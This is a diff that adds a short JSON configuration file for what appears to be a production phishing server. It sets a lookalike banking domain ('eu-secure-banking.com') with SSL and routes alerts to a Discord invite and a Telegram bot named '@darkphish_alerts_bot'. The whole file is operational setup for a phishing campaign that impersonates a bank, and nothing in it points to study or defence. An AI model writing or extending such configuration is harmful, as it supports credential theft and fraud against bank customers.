@@ -1,0 +1,10 @@
+{
+  "server": "phish-prod-eu-01",
+  "domain": "eu-secure-banking.com",
+  "ssl": true,
+  "alerts": {
+    "discord_webhook": "https://discord.gg/AAcS23YHVS",
+    "telegram_bot": "@darkphish_alerts_bot"
+  },
+  "team_channel": "https://discord.gg/AAcS23YHVS"
+}
